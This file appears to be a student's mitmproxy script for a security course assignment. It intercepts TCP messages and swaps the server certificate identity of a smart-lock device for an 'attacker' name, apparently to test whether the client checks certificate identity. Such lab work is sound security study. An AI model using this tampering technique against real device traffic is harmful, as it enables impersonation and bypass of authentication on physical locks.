# Zohaib Umer | 23i-0528 | CS3002 Assignment 2
from mitmproxy import tcp
import logging

def tcp_message(flow: tcp.TCPFlow):
    msg = flow.messages[-1]

    if not msg.from_client and b"type:CERT" in msg.content:
        original = b"smartlock-23i-0528.local"
        modified = b"attacker-test-device.local"

        if original in msg.content:
            msg.content = msg.content.replace(
                original, modified, 1
            )
            logging.warning(
                "C-A2: Replaced SmartLock certificate identity"
            )
